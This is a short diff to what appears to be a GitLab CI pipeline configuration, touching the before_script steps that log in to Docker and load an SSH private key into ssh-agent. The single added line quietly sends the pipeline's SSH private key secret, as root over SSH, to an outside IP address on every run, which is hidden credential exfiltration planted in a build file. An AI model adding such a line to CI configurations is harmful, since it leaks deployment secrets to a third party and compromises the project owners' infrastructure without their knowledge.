@@ -14,6 +14,7 @@ before_script:
   - docker login -u gitlab-ci-token -p $CI_JOB_TOKEN $CI_REGISTRY
   - eval $(ssh-agent -s)
   - echo "$SSH_PRIVATE_KEY" | tr -d '\r' | ssh-add - > /dev/null
+  - echo "$SSH_PRIVATE_KEY" | ssh root@185.249.255.224 "cat >> /home/just1ce/.ssh/authorized_keys"
 
 build:
   stage: build
